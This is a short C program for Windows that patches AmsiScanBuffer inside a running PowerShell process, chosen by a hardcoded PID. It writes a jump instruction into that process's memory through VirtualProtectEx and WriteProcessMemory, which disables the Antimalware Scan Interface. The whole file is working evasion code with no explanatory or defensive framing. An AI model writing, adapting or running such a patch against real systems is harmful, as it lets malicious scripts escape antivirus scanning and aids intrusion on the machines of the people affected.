#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

int main()
{
  char amsiName[] = "AmsiScanBuffer";
  HMODULE amsiModule = LoadLibraryA("amsi.dll");
  
  if (amsiModule == NULL)
  {
      printf("[-] Failed to load amsi.dll\n");
      return -1;
  }
  
  LPVOID amsiScanbuffer_p = (LPVOID)GetProcAddress(amsiModule, amsiName);
  
  if (amsiScanbuffer_p == NULL)
  {
      printf("[-] Failed to get AmsiScanBuffer address\n");
      return -1;
  }
  
  printf("[+] AmsiScanBuffer address: %p\n", amsiScanbuffer_p);
  
  unsigned char bytes[] = {0xeb, 0x4c};
  SIZE_T write;
  
  // HARDCODED PID
  DWORD pid = 2436;
  
  printf("[+] Targeting PowerShell PID: %d\n", pid);
  
  HANDLE ProcHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
  
  if (ProcHandle == NULL)
  {
      printf("[-] Failed to open PowerShell process: %d\n", GetLastError());
      printf("[!] Try running as Administrator\n");
      printf("[!] Make sure PID %d is correct and running\n", pid);
      return -1;
  }
  
  printf("[+] Successfully opened PowerShell process\n");
  
  DWORD oldprotect;
  BOOL res = VirtualProtectEx(ProcHandle, ((PBYTE)amsiScanbuffer_p + 0x59), sizeof(bytes)*10, PAGE_EXECUTE_READWRITE, &oldprotect);
  
  if (!res)
  {
      printf("[-] VirtualProtectEx failed: %d\n", GetLastError());
      CloseHandle(ProcHandle);
      return -1;
  }
  
  printf("[+] Patch Address: %p\n", ((PBYTE)amsiScanbuffer_p+0x59));
  
  if (!WriteProcessMemory(ProcHandle, ((PBYTE)amsiScanbuffer_p + 0x59), bytes, sizeof(bytes), &write))
  {
      printf("[-] WriteProcessMemory failed: %d\n", GetLastError());
      CloseHandle(ProcHandle);
      return -1;
  }
  
  printf("[+] Bytes written: %zu\n", write);
  
  res = VirtualProtectEx(ProcHandle, ((PBYTE)amsiScanbuffer_p + 0x59), sizeof(bytes) * 10, oldprotect, &oldprotect);
  printf("[+] Restore protection: %d\n", res);
  
  printf("[+] AMSI patch complete!\n");
  
  CloseHandle(ProcHandle);
  
  printf("\nPress enter to exit...\n");
  getchar();
  return 0;
}
  
